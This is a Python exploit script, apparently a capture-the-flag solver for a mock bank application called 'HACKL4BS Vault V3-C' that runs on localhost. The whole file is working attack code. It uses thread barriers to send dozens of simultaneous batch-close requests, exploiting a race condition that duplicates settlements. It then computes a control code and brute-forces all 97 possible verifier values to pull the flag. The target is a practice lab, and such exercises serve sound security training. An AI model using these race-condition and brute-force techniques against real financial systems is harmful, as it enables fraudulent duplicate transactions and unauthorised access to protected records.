#!/usr/bin/env python3
import argparse
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from threading import Barrier

DEFAULT_BASE = 'http://localhost:8080'
DEFAULT_WORKERS = 60
DEFAULT_AMOUNT = 100
DEFAULT_OPERATIONS = 2
DEFAULT_RETRY_OPERATIONS = [2, 3, 4]
DEFAULT_RETRY_WORKERS = [32, 48, 64]


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

    http_error_301 = http_error_302 = http_error_303 = http_error_307 = http_error_308 = (
        lambda self, req, fp, code, msg, headers: fp
    )


def get_text(url: str) -> str:
    with urllib.request.urlopen(url, timeout=25) as response:
        return response.read().decode('utf-8', errors='ignore')


def request_text(url: str, data: dict[str, str] | None = None, *, follow_redirects: bool = True) -> tuple[int, str]:
    if data is None:
        req = urllib.request.Request(url, headers={'User-Agent': 'vault-v3c-solver/1.0'})
        opener = urllib.request.build_opener() if follow_redirects else urllib.request.build_opener(NoRedirect)
        try:
            with opener.open(req, timeout=25) as resp:
                return resp.getcode(), resp.read().decode('utf-8', errors='ignore')
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode('utf-8', errors='ignore')

    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(
        url,
        data=body,
        method='POST',
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'vault-v3c-solver/1.0',
        },
    )
    opener = urllib.request.build_opener() if follow_redirects else urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=45) as resp:
            return resp.getcode(), resp.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode('utf-8', errors='ignore')


def extract(pattern: str, text: str, label: str) -> str:
    match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
    if not match:
        raise RuntimeError(f'No pude extraer {label}')
    return match.group(1)


def reset_window(base_url: str) -> None:
    html = get_text(base_url + '/')
    reset_token = extract(r'name="reset_token" value="([^"]+)"', html, 'reset_token')
    request_text(base_url + '/reset.php', {'reset_token': reset_token})
    time.sleep(0.5)


def prepare_operation(base_url: str, amount: int, destination_alias: str, concept: str) -> tuple[str, str]:
    _, html = request_text(
        base_url + '/preparar.php',
        {
            'monto_operacion': str(amount),
            'alias_destino': destination_alias,
            'referencia_cliente': concept,
        },
    )
    operation_id = extract(r'name="operation_id" value="([^"]+)"', html, 'operation_id')
    transfer_token = extract(r'name="transfer_token" value="([^"]+)"', html, 'transfer_token')
    return operation_id, transfer_token


def confirm_parallel(base_url: str, operation_id: str, transfer_token: str, workers: int) -> list[int]:
    barrier = Barrier(workers)

    def worker(_: int) -> int:
        barrier.wait()
        code, _ = request_text(
            base_url + '/confirmar.php',
            {'operation_id': operation_id, 'transfer_token': transfer_token},
        )
        return code

    with ThreadPoolExecutor(max_workers=workers) as pool:
        return list(pool.map(worker, range(workers)))


def attach_operation(base_url: str, operation_id: str) -> None:
    request_text(base_url + '/lote.php', {'action': 'attach', 'operation_id': operation_id})


def mark_batch_ready(base_url: str, batch_id: str) -> tuple[str, str]:
    _, html = request_text(base_url + '/lote.php', {'action': 'ready', 'batch_id': batch_id})
    close_token = extract(r'name="close_token" value="([^"]+)"', html, 'close_token')
    return close_token, html


def close_batch_parallel(base_url: str, batch_id: str, close_token: str, workers: int) -> list[int]:
    barrier = Barrier(workers)

    def worker(_: int) -> int:
        barrier.wait()
        code, _ = request_text(
            base_url + '/cerrar_lote.php',
            {'batch_id': batch_id, 'close_token': close_token},
        )
        return code

    with ThreadPoolExecutor(max_workers=workers) as pool:
        return list(pool.map(worker, range(workers)))


def current_batch(base_url: str) -> str:
    html = get_text(base_url + '/lote.php')
    return extract(r'<h2>(LT-[A-F0-9]+)</h2>', html, 'batch_id')


def parse_mesa_control(base_url: str) -> dict[str, str]:
    html = get_text(base_url + '/mesa_control.php')
    return parse_mesa_control_html(html)


def parse_mesa_control_html(html: str) -> dict[str, str]:
    data = {
        'batch_id': extract(r'Referencia de lote:\s*<strong>(LT-[A-F0-9]+)</strong>', html, 'batch_id'),
        'batch_total': extract(r'Total del lote:\s*<strong>\$?([0-9\.,]+)</strong>', html, 'batch_total'),
        'settlement_count': extract(r'Asientos de cierre:\s*<strong>(\d+)</strong>', html, 'settlement_count'),
        'suffix': extract(r'Sufijo visible:\s*<strong>([A-F0-9]{4})</strong>', html, 'suffix'),
    }
    return data


def money_to_int(value: str) -> int:
    digits = re.sub(r'[^0-9]', '', value)
    return int(digits) if digits else 0


def compute_control(batch_total: int, settlement_count: int, suffix: str) -> str:
    suffix_num = int(suffix, 16)
    return f'{(batch_total + settlement_count + suffix_num) % 97:02d}'


def wait_for_review(base_url: str, timeout: float = 25.0, interval: float = 0.5) -> tuple[dict[str, str], str]:
    deadline = time.time() + timeout
    last_error: Exception | None = None
    last_key: tuple[str, str, str, str] | None = None
    stable_hits = 0
    stable_target = 3
    while time.time() < deadline:
        try:
            html = get_text(base_url + '/mesa_control.php')
            if 'Lote derivado a mesa de control' in html:
                data = parse_mesa_control_html(html)
                key = (data['batch_id'], data['batch_total'], data['settlement_count'], data['suffix'])
                if key == last_key:
                    stable_hits += 1
                else:
                    stable_hits = 1
                    last_key = key
                if stable_hits >= stable_target:
                    return data, html
        except Exception as exc:  # noqa: BLE001
            last_error = exc
        time.sleep(interval)
    if last_error is not None:
        raise RuntimeError(f'La mesa de control no estuvo lista a tiempo: {last_error}')
    raise RuntimeError('La mesa de control no mostró expediente durante la ventana esperada.')


def fetch_flag(base_url: str, batch_id: str, control: str) -> str:
    query = urllib.parse.urlencode({'lote': batch_id, 'verificador_cierre': control})
    html = get_text(base_url + '/expediente.php?' + query)
    code = re.search(r'<div class="audit-code">\s*([^<]+)\s*</div>', html)
    if code:
        return code.group(1).strip()
    flag = re.search(r'(HACKL4BS\{[^<\s]+\})', html)
    if flag:
        return flag.group(1)
    return 'NO_FLAG'


def brute_force_flag(base_url: str, batch_id: str, preferred_control: str) -> tuple[str, str, str]:
    candidates: list[str] = [preferred_control]
    candidates.extend(f'{index:02d}' for index in range(97))

    seen: set[str] = set()
    for control in candidates:
        if control in seen:
            continue
        seen.add(control)
        query = urllib.parse.urlencode({'lote': batch_id, 'verificador_cierre': control})
        html = get_text(base_url + '/expediente.php?' + query)
        if 'Expediente no disponible' in html:
            continue
        code = re.search(r'<div class="audit-code">\s*([^<]+)\s*</div>', html)
        if code:
            return control, code.group(1).strip(), html
        flag = re.search(r'(HACKL4BS\{[^<\s]+\})', html)
        if flag:
            return control, flag.group(1), html

    return preferred_control, 'NO_FLAG', ''


def solve_once(base_url: str, workers: int, operations: int, amount: int) -> tuple[bool, str, dict[str, str]]:
    reset_window(base_url)

    operation_ids: list[str] = []
    transfer_token: str | None = None
    for index in range(operations):
        op_id, token = prepare_operation(base_url, amount, 'vault.reserve@hackl4bs', 'Compensación privada')
        operation_ids.append(op_id)
        transfer_token = token
        code, _ = request_text(
            base_url + '/confirmar.php',
            {'operation_id': op_id, 'transfer_token': token},
        )
        if code not in (200, 303):
            raise RuntimeError(f'Confirmación normal falló para {op_id} con HTTP {code}')
        attach_operation(base_url, op_id)

    batch_id = current_batch(base_url)
    close_token, _ = mark_batch_ready(base_url, batch_id)
    close_codes = close_batch_parallel(base_url, batch_id, close_token, workers)
    time.sleep(1.2)

    mesa, mesa_html = wait_for_review(base_url)
    control = compute_control(
        money_to_int(mesa['batch_total']),
        int(mesa['settlement_count']),
        mesa['suffix'],
    )
    chosen_control, flag, expedition_ok = brute_force_flag(base_url, batch_id, control)
    control = chosen_control

    review_html = mesa_html
    dashboard_html = get_text(base_url + '/')

    passed = (
        'Lote derivado a mesa de control' in mesa_html
        and 'Calcule la clave de conciliación con los datos del cierre operativo.' in mesa_html
        and flag != 'NO_FLAG'
        and 'Expediente no disponible' not in expedition_ok
    )

    info = {
        'batch_id': batch_id,
        'batch_total': mesa['batch_total'],
        'settlement_count': mesa['settlement_count'],
        'suffix': mesa['suffix'],
        'control': control,
        'flag': flag,
        'close_ok': str(sum(1 for c in close_codes if c == 200)),
        'expediente_ok': str('Expediente no disponible' not in expedition_ok),
        'incident_total': str(len(re.findall(r'Incident|incidente', dashboard_html, re.IGNORECASE))),
    }
    return passed, flag, info


def main() -> int:
    parser = argparse.ArgumentParser(description='Solver para Banco HACKL4BS Vault V3-C')
    parser.add_argument('--url', default=DEFAULT_BASE, help='Base URL del reto')
    parser.add_argument('--workers', type=int, default=DEFAULT_WORKERS, help='Workers base para cerrar lote')
    parser.add_argument('--ops', type=int, default=DEFAULT_OPERATIONS, help='Operaciones base a meter al lote')
    parser.add_argument('--amount', type=int, default=DEFAULT_AMOUNT, help='Monto por operación')
    args = parser.parse_args()

    base_url = args.url.rstrip('/')

    try:
        target_workers = max(args.workers, 60)
        attempt_plan = [(2, 60)] * 6 + [
            (2, 50),
            (2, 60),
            (2, 64),
            (3, 60),
            (3, 50),
            (3, 64),
            (target_workers, target_workers),
            (max(args.ops, 3), max(args.workers, 50)),
        ]

        tried = 0
        last_error = None
        for ops, workers in attempt_plan:
            tried += 1
            print(f'[*] Probando con {workers} cierres paralelos y {ops} operaciones...')
            try:
                passed, flag, info = solve_once(base_url, workers, ops, args.amount)
                print(f'[*] batch_id: {info["batch_id"]}')
                print(f'[*] batch_total: {info["batch_total"]} | settlements: {info["settlement_count"]} | suffix: {info["suffix"]}')
                print(f'[*] control calculado: {info["control"]}')
                print(f'[*] cierres OK: {info["close_ok"]}/{workers}')
                print(f'[*] expediente OK: {info["expediente_ok"]} | flag detectada: {info["flag"]}')
                if passed:
                    print(f'[+] FLAG: {flag}')
                    return 0
                print('[-] El intento no llegó al estado esperado; probando siguiente combinación si existe.')
            except Exception as exc:  # noqa: BLE001
                last_error = exc
                print(f'[-] Intento falló: {exc}')
        if last_error:
            raise last_error
        print(f'[-] No se logró resolver después de {tried} intentos.')
        return 1
    except urllib.error.HTTPError as exc:
        print(f'[-] HTTP error: {exc.code}')
        return 1
    except Exception as exc:  # noqa: BLE001
        print(f'[-] Error: {exc}')
        return 1


if __name__ == '__main__':
    sys.exit(main())
